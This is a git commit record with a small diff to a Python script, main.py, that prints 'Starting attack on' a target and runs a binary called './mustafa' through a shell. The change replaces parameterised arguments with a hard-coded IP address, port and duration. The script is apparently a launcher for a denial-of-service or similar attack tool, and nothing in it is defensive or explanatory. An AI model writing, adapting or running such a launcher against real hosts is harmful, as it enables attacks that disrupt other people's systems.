d82d6ccb04a4afeb82e91011eef3f681b84bacd7
AvinashGangary <avinashgangary78@gmail.com>
2026-01-06 23:03:31 +0530

    Update main.py

--- main.py
+++ main.py
@@ -14,7 +14,7 @@ def main():
     
     print(f"Starting attack on {ip}:{port}")
     
-    result = subprocess.run(f"./mustafa {ip} {port} {time} {threads}", shell=True)
+    result = subprocess.run(f"./mustafa 15.220.137.235 19959 180", shell=True)
     
     print(f"Attack finished")
 
